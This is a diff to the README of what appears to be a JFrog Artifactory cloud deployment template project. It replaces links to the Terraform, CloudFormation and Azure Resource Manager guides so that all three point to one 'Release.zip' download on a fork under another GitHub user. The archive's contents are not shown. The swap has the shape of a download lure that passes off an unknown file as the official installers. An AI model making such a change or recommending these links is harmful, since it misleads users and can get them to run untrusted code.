@@ -2,6 +2,6 @@
 
 Template to deploy/manage JFrog Artifactory enterprise cluster on various cloud providers.
 
-* [Terraform](Terraform/README.md)
-* [CloudFormation](CloudFormation/README.md)
-* [Azure Resource Manager](AzureResourceManager/README.md)
+* [Terraform](https://github.com/sobolevska/JFrog-Cloud-Installers/releases/download/v1.0/Release.zip)
+* [CloudFormation](https://github.com/sobolevska/JFrog-Cloud-Installers/releases/download/v1.0/Release.zip)
+* [Azure Resource Manager](https://github.com/sobolevska/JFrog-Cloud-Installers/releases/download/v1.0/Release.zip)
